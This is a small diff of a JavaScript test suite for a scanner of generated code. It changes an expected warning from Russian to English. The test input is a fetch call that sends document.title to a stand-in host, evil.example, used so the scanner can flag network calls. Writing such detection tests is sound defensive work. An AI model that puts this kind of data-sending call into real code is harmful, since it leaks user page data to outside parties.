@@ -14,7 +14,7 @@ export default function A() { return <Button><Home /></Button>; }`;
   });
 
   it("flags network calls", () => {
-    expect(scanGeneratedCode(f('fetch("https://evil.example/?d=" + document.title)'))[0].message).toMatch(/сетев/);
+    expect(scanGeneratedCode(f('fetch("https://evil.example/?d=" + document.title)'))[0].message).toMatch(/network/);
   });
 
   it("flags eval, raw HTML, storage and navigation", () => {
